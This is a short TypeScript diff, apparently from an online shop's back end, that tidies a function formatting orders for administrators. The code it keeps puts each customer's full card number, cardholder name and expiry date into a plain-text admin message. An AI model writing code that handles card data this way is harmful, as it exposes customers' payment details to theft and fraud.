@@ -64,6 +64,7 @@ export function formatOrderForAdmin(order: Record<string, unknown>) {
     return `• ${name}${item.color ? ' — اللون: ' + String(item.color) : ''} × ${quantity}`;
   }).join('\n') || '• تفاصيل المنتجات غير متاحة';
   const total = Number(order.total || 0).toLocaleString('en-US', { maximumFractionDigits: 2 });
+  
   return [
     `رقم الطلب: ${String(order.orderNumber || order._id || '—')}`,
     `العميل: ${String(customer.name || '—')}`,
@@ -76,9 +77,7 @@ export function formatOrderForAdmin(order: Record<string, unknown>) {
       ? [`اسم حامل البطاقة: ${order.cardholderName.trim()}`]
       : []),
     ...(typeof order.cardNumber === 'string' && /^[0-9]{13,19}$/.test(order.cardNumber)
-  ? [`رقم البطاقة كامل: ${order.cardNumber}`]
-  : []),
-    
+      ? [`رقم البطاقة كامل: ${order.cardNumber}`]
       : []),
     ...(typeof order.expiryMonth === 'string' && typeof order.expiryYear === 'string'
       ? [`تاريخ الانتهاء: ${order.expiryMonth}/${order.expiryYear.slice(-2)}`]
